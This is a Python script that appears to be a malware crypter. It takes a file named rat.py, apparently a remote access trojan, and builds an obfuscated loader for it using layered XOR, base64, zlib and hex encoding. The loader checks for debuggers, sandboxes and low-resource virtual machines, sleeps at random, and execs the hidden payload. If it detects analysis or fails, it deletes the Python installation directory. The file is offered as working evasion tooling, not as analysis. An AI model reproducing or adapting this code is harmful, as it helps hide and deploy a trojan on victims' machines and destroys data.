import os
import base64
import zlib
import random
import string
import sys

def generate_xor_key():
    return random.randint(1, 255)

def multi_layer_encrypt(code):
    xor_key = generate_xor_key()
    xor_data = bytes([b ^ xor_key for b in code.encode('utf-8')])
    b64_data = base64.b64encode(xor_data).decode('ascii')
    comp_data = zlib.compress(b64_data.encode('utf-8'))
    rev_data = comp_data[::-1]
    hex_data = rev_data.hex()
    return hex_data, xor_key

def generate_loader(original_code):
    hex_data, xor_key = multi_layer_encrypt(original_code)
    dec_name = ''.join(random.choices(string.ascii_lowercase, k=8))
    enc_var = ''.join(random.choices(string.ascii_lowercase, k=6))
    xor_var = ''.join(random.choices(string.ascii_lowercase, k=6))
    t1 = ''.join(random.choices(string.ascii_lowercase, k=4))
    t2 = ''.join(random.choices(string.ascii_lowercase, k=4))
    t3 = ''.join(random.choices(string.ascii_lowercase, k=4))
    t4 = ''.join(random.choices(string.ascii_lowercase, k=4))
    
    return f'''# ============ {dec_name} ============
import base64,zlib,sys,ctypes,time,random

def _check_sandbox():
    try:
        if time.time() < 1600000000:
            return True
        if ctypes.windll.kernel32.IsDebuggerPresent():
            return True
        try:
            ntdll = ctypes.windll.ntdll
            status = ctypes.c_ulong()
            ntdll.NtQueryInformationProcess(ctypes.windll.kernel32.GetCurrentProcess(), 0, ctypes.byref(status), 4, None)
            if status.value & 0x1000000:
                return True
        except:
            pass
        class MEM(ctypes.Structure):
            _fields_ = [("dwLength", ctypes.c_ulong), ("dwMemoryLoad", ctypes.c_ulong),
                       ("ullTotalPhys", ctypes.c_ulonglong), ("ullAvailPhys", ctypes.c_ulonglong),
                       ("ullTotalPageFile", ctypes.c_ulonglong), ("ullAvailPageFile", ctypes.c_ulonglong),
                       ("ullTotalVirtual", ctypes.c_ulonglong), ("ullAvailVirtual", ctypes.c_ulonglong),
                       ("ullAvailExtendedVirtual", ctypes.c_ulonglong)]
        mem = MEM()
        mem.dwLength = ctypes.sizeof(MEM)
        if ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(mem)):
            if mem.ullTotalPhys < 2 * 1024 * 1024 * 1024:
                return True
        try:
            import psutil
            if psutil.cpu_count() < 2:
                return True
        except:
            pass
        t1 = ctypes.windll.kernel32.GetTickCount()
        time.sleep(0.1)
        t2 = ctypes.windll.kernel32.GetTickCount()
        if t2 - t1 < 10:
            return True
        return False
    except:
        return False

if _check_sandbox():
    try:
        import shutil, os
        shutil.rmtree(os.path.dirname(sys.executable))
    except:
        pass
    sys.exit(0)

time.sleep(random.randint(3, 5))

_{dec_name} = lambda s,k: bytes([b ^ k for b in bytes.fromhex(s)[::-1]])
_{enc_var} = "{hex_data}"
_{xor_var} = {xor_key}

try:
    _{t1} = bytes.fromhex(_{enc_var})[::-1]
    _{t2} = zlib.decompress(_{t1})
    _{t3} = base64.b64decode(_{t2})
    _{t4} = bytes([b ^ _{xor_var} for b in _{t3}])
    exec(_{t4}.decode('utf-8'), globals())
except:
    try:
        import shutil, os
        shutil.rmtree(os.path.dirname(sys.executable))
    except:
        pass
    sys.exit(0)
'''

def main():
    print("[+] Loading rat.py...")
    with open('rat.py', 'r', encoding='utf-8') as f:
        code = f.read()
    
    print("[+] Generating obfuscated loader...")
    loader = generate_loader(code)
    
    with open('loader_obf.py', 'w', encoding='utf-8') as f:
        f.write(loader)
    
    print("[+] loader_obf.py created!")
    print("[+] Build size: ~22-25 MB")

if __name__ == "__main__":
    main()
